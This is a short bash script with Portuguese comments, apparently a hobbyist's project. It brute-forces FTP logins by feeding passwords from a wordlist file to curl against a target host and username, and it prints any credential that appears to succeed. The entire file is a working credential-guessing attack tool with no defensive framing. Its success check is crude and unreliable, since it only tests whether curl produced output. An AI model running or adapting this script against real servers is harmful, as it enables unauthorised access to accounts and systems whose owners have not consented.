#!/usr/bin/env bash
#Script que faz bruteforce em servidores FTP e se houver resposta positiva mostra na saida do script
#Eu irei ligar um server ftp só para testar a veracidade desse script, pois não dá para ter certeza!
#Ainda nao posso ter certeza da integridade desse script (se funciona ou não, pois teve apenas mensagem de erro (brute force é foda))
#dia 25 de maio ás 23:17


#dia 28 de junho
#Ajustes etc

#Código podre, mas funciona
#O curl nao gosta de mim


while read senhas;do
  $(curl -su $1:$senhas ftp://$2:21)
if [ $(curl -su $1:$senhas ftp://$2:21) ];then
  echo "Encontrado credencial: username: $1 password: $senhas"
else
  echo "Nenhuma credencial com sucesso"
fi
done < senhasftp.txt

#230 (código de logado com sucesso!)
